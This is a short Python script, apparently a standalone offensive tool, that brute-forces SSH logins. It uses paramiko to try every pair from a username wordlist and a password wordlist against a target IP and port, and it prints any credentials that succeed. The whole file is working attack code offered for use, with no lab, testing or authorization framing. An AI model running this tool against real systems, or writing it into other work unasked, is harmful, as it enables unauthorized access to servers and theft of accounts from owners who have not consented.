import paramiko
import sys

print("Usage: python ssh_bruteforce.py <ip> <port> <username_file> <password_file>\n")

try:
    target = sys.argv[1]
    port = int(sys.argv[2])
    username_file = sys.argv[3]
    password_file = sys.argv[4]

except IndexError:
    print("[-] Missing arguments!")
    sys.exit()

# ---------------------------------------
# SSH connect function
# ---------------------------------------
def ssh_connect(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=3)
        ssh.close()
        return True

    except paramiko.AuthenticationException:
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False


# ---------------------------------------
# Load wordlists
# ---------------------------------------
with open(username_file, "r") as uf:
    usernames = uf.read().splitlines()

with open(password_file, "r") as pf:
    passwords = pf.read().splitlines()


# ---------------------------------------
# Attempt brute force
# ---------------------------------------
print(f"[*] Starting SSH brute force on {target}:{port}\n")

try:
    for user in usernames:
        for pwd in passwords:
            print(f"Trying: {user} : {pwd}")

            if ssh_connect(target, port, user, pwd):
                print("\n[✔] LOGIN SUCCESSFUL!")
                print(f"[+] Username: {user}")
                print(f"[+] Password: {pwd}")
                sys.exit()

    print("\n[-] No valid credentials found.")

except KeyboardInterrupt:
    print("\n[!] Exiting...")
    sys.exit()
